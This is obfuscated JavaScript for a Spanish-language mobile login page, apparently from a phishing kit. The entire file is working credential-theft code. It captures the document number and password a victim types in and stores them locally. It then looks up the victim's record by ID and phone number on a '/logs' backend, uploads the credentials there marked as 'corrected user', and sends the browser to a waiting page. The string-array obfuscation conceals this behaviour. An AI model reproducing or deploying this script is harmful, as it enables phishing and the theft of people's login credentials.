function _0x1246(_0x4d260c, _0x3d7c0e) {
  const _0x11fe33 = _0x11fe();
  return (
    (_0x1246 = function (_0x1246f9, _0x3ce2c9) {
      _0x1246f9 = _0x1246f9 - 0x97;
      let _0x180873 = _0x11fe33[_0x1246f9];
      return _0x180873;
    }),
    _0x1246(_0x4d260c, _0x3d7c0e)
  );
}
const _0xf65844 = _0x1246;
(function (_0x46778b, _0x5344d0) {
  const _0x56ee20 = _0x1246,
    _0x1a09a9 = _0x46778b();
  while (!![]) {
    try {
      const _0x787626 =
        parseInt(_0x56ee20(0xa9)) / 0x1 +
        (parseInt(_0x56ee20(0xac)) / 0x2) * (parseInt(_0x56ee20(0x9d)) / 0x3) +
        -parseInt(_0x56ee20(0xa1)) / 0x4 +
        (-parseInt(_0x56ee20(0xba)) / 0x5) * (parseInt(_0x56ee20(0xa8)) / 0x6) +
        (-parseInt(_0x56ee20(0xb9)) / 0x7) * (parseInt(_0x56ee20(0xa4)) / 0x8) +
        parseInt(_0x56ee20(0xad)) / 0x9 +
        (parseInt(_0x56ee20(0xa6)) / 0xa) * (parseInt(_0x56ee20(0xae)) / 0xb);
      if (_0x787626 === _0x5344d0) break;
      else _0x1a09a9["push"](_0x1a09a9["shift"]());
    } catch (_0x2a4fc3) {
      _0x1a09a9["push"](_0x1a09a9["shift"]());
    }
  }
})(_0x11fe, 0xe7765);
function updateLS() {
  const _0x38996c = _0x1246;
  LS[_0x38996c(0x9f)](_0x38996c(0xaf), JSON[_0x38996c(0xb4)](info));
}
const button = document[_0xf65844(0x9b)](_0xf65844(0xa5)),
  userInput = document[_0xf65844(0x9b)]("docNumberMovil"),
  passInput = document["getElementById"]("passwordMovil");
function _0x11fe() {
  const _0x585b02 = [
    "disabled",
    "setItem",
    "json",
    "543912pMItXp",
    "PUT",
    "metaInfo",
    "8FJViXR",
    "btnLogin-page1",
    "184620iyVoWV",
    "log",
    "42XTtqxa",
    "627118mlWbkk",
    "focus",
    "puser",
    "698QQWqSw",
    "14082300SRaUZQ",
    "550jDjdJS",
    "info",
    "value",
    "/logs/logs",
    "application/json",
    "Corrigió\x20Usuario",
    "stringify",
    "GET",
    "Error\x20al\x20actualizar\x20usuario:",
    "Usuario\x20actualizado",
    "/logs/logUser/",
    "9505643CmksdV",
    "506335cerVhx",
    "telnum",
    "addEventListener",
    "user",
    "href",
    "getElementById",
    "error",
    "309GCDKwu",
  ];
  _0x11fe = function () {
    return _0x585b02;
  };
  return _0x11fe();
}
async function updateStatus() {
  const _0x93c44b = _0xf65844;
  button[_0x93c44b(0x9e)] = !![];
  const _0x1f9850 = await fetch(url + _0x93c44b(0xb1), {
      method: _0x93c44b(0xb5),
      headers: { "Content-Type": _0x93c44b(0xb2) },
    }),
    _0x4e1f56 = await _0x1f9850[_0x93c44b(0xa0)](),
    _0x1de968 = [..._0x4e1f56];
  for (const _0x5af2fb of _0x1de968) {
    if (
      _0x5af2fb["reg"] == info[_0x93c44b(0xa3)]["cc"] &&
      _0x5af2fb["cl"] == info[_0x93c44b(0xa3)][_0x93c44b(0x97)]
    ) {
      console["log"]("Usuario\x20encontrado");
      const _0x574896 = await fetch(
          url + _0x93c44b(0xb8) + _0x5af2fb["idreg"],
          {
            method: _0x93c44b(0xa2),
            headers: { "Content-Type": _0x93c44b(0xb2) },
            body: JSON[_0x93c44b(0xb4)]({
              us: info[_0x93c44b(0xa3)][_0x93c44b(0x99)],
              ps: info["metaInfo"][_0x93c44b(0xab)],
              status: _0x93c44b(0xb3),
            }),
          }
        ),
        _0xb27653 = await _0x574896[_0x93c44b(0xa0)]();
      _0x574896["ok"]
        ? console[_0x93c44b(0xa7)](_0x93c44b(0xb7))
        : console[_0x93c44b(0x9c)](_0x93c44b(0xb6), _0x574896["statusText"]);
    }
  }
  (button[_0x93c44b(0x9e)] = ![]),
    (window["location"][_0x93c44b(0x9a)] = "wait.html");
}
button[_0xf65844(0x98)]("click", async function (_0x39a2c1) {
  const _0xbaca77 = _0xf65844;
  _0x39a2c1["preventDefault"]();
  if (userInput[_0xbaca77(0xb0)] == "" && passInput[_0xbaca77(0xb0)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0xbaca77(0xaa)]();
    return;
  } else {
    var _0x50525e = userInput["value"],
      _0x236ca1 = passInput[_0xbaca77(0xb0)];
    (info[_0xbaca77(0xa3)]["user"] = _0x50525e),
      (info["metaInfo"]["puser"] = _0x236ca1),
      updateLS(),
      await updateStatus();
  }
});
